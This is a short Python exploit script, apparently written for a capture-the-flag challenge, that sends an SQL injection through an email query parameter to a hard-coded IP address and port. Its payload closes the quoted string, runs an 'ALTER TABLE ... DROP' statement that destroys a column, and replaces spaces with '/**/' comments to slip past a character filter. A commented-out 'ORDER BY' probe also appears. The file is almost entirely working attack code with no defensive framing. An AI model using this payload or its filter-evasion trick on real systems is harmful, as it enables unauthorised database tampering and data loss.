#!/usr/bin/env python3

from requests import *
from bs4 import BeautifulSoup
from urllib.parse import quote

url = 'http://172.104.255.16:1337/'

forbidden = "(),;:"

payload = "ALTER TABLE 'cities' DROP 'email'"
#payload = "ORDER BY 1"
email = f"' {payload} --@g.c"
email = email.replace(' ','/**/')

print(email)

r = get(url + f'?email={email}')

parsed = BeautifulSoup(r.content, "html.parser")
tag = parsed.find("pre")
print(tag.text)